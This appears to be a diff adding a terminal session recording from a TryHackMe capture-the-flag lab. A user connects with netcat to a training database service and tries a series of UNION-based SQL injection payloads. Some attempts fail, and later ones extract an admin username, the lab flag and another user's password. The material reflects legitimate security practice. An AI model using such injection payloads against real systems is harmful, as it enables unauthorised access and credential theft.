@@ -1,0 +1,44 @@
+Script started on 2025-01-20 20:49:30+03:00 [COMMAND="nc light.thm 1337" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="27"]
+Welcome to the Light database!
+Please enter your username: smokey’ Union Select username FROM admintable WHERE username like ‘%
+Username not found.
+Please enter your username: smokey' Union Select username FROM admintable WHERE username like '%
+Password: TryHackMeAdmin
+Please enter your username: smokey' Union Select username FROM admintable WHERE username = 'TryHackMeAdmin' '%
+Error: near "'%'": syntax error
+Please enter your username: smokey' Union Select username FROM admintable WHERE username = 'TryHackMeAdmin' '%^[[D                           ^C
+
+Script done on 2025-01-20 20:51:40+03:00 [COMMAND_EXIT_CODE="1"]
+Script started on 2025-01-20 20:51:44+03:00 [COMMAND="nc light.thm 1337" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="27"]
+Welcome to the Light database!
+Please enter your username: smokey' Union Select username FROM admintable WHERE username = "TryHackMeAdmin" '%
+Error: near "'%'": syntax error
+Please enter your username: smokey' Union Select username FROM admintable WHERE username = TryHackMeAdmin '%
+Error: near "'%'": syntax error
+Please enter your username: smokey' Union Select username FROM admintable WHERE username = 'TryHackMeAdmin
+Password: TryHackMeAdmin
+Please enter your username: smokey' Union Select password FROM admintable WHERE username = 'TryHackMeAdmin' '%
+Error: near "'%'": syntax error
+Please enter your username: smokey' Union Select password FROM admintable WHERE username = 'TryHackMeAdmin' '
+Error: near "''": syntax error
+Please enter your username: smokey' Union Select password FROM admintable WHERE username = 'TryHackMeAdmin' '%
+Error: near "'%'": syntax error
+Please enter your username: smokey’ Union Select username FROM admintable WHERE username like ‘%
+Username not found.
+Please enter your username: smokey’ Union Select username FROM admintable WHERE username like ‘%
+Username not found.
+Please enter your username: TryHackMeAdmin' Union Select password FROM admintable WHERE username like '%
+Password: THM{SQLit3_InJ3cTion_is_SimplE_nO?}
+Please enter your username: TryHackMeAdmin' Union Select username FROM admintable WHERE username like '%
+Password: TryHackMeAdmin
+Please enter your username: TryHackMeAdmin' Union Select password FROM admintable WHERE password like '%
+Password: THM{SQLit3_InJ3cTion_is_SimplE_nO?}
+Please enter your username: TryHackMeAdmin' Union Select password FROM admintable WHERE username = 'TryHackMeAdmin' '%
+Error: near "'%'": syntax error
+Please enter your username: smokey
+Password: vYQ5ngPpw8AdUmL
+Please enter your username: vYQ5ngPpw8AdUmL' Uno ion Select password fr  FROM admintable WHERE user rname like '%
+Password: THM{SQLit3_InJ3cTion_is_SimplE_nO?}
+Please enter your username: e ^C
+
+Script done on 2025-01-20 21:02:00+03:00 [COMMAND_EXIT_CODE="1"]
